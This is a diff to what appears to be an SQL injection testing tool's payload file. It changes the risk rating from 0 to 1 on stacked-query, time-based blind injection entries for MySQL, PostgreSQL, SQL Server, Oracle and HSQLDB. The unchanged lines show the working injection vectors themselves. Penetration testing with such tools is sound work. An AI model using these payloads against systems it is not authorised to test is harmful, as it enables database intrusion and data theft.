@@ -6,7 +6,7 @@
         <title>MySQL &gt; 5.0.11 stacked queries (SELECT)</title>
         <stype>4</stype>
         <level>2</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
@@ -26,7 +26,7 @@
         <title>MySQL &gt; 5.0.11 stacked queries (SELECT - comment)</title>
         <stype>4</stype>
         <level>4</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
@@ -47,7 +47,7 @@
         <title>MySQL &gt; 5.0.11 stacked queries</title>
         <stype>4</stype>
         <level>1</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;SELECT IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
@@ -88,7 +88,7 @@
         <title>PostgreSQL &gt; 8.1 stacked queries</title>
         <stype>4</stype>
         <level>1</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
@@ -129,7 +129,7 @@
         <title>PostgreSQL &lt; 8.2 stacked queries (Glibc)</title>
         <stype>4</stype>
         <level>4</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT [RANDNUM] FROM SLEEP([SLEEPTIME])) ELSE [RANDNUM] END)</vector>
@@ -151,7 +151,7 @@
         <title>Microsoft SQL Server/Sybase stacked queries</title>
         <stype>4</stype>
         <level>1</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'</vector>
@@ -173,7 +173,7 @@
         <title>Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>4</stype>
         <level>5</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;SELECT CASE WHEN ([INFERENCE]) THEN DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) ELSE [RANDNUM] END FROM DUAL</vector>
@@ -213,7 +213,7 @@
         <title>Oracle stacked queries (DBMS_LOCK.SLEEP)</title>
         <stype>4</stype>
         <level>5</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE DBMS_LOCK.SLEEP(0); END IF; END</vector>
@@ -233,7 +233,7 @@
         <title>Oracle stacked queries (USER_LOCK.SLEEP)</title>
         <stype>4</stype>
         <level>5</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;BEGIN IF ([INFERENCE]) THEN USER_LOCK.SLEEP([SLEEPTIME]); ELSE USER_LOCK.SLEEP(0); END IF; END</vector>
@@ -295,7 +295,7 @@
         <title>HSQLDB &gt;= 1.7.2 stacked queries</title>
         <stype>4</stype>
         <level>3</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END</vector>
@@ -316,7 +316,7 @@
         <title>HSQLDB &gt;= 2.0 stacked queries</title>
         <stype>4</stype>
         <level>4</level>
-        <risk>0</risk>
+        <risk>1</risk>
         <clause>0</clause>
         <where>1</where>
         <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END</vector>
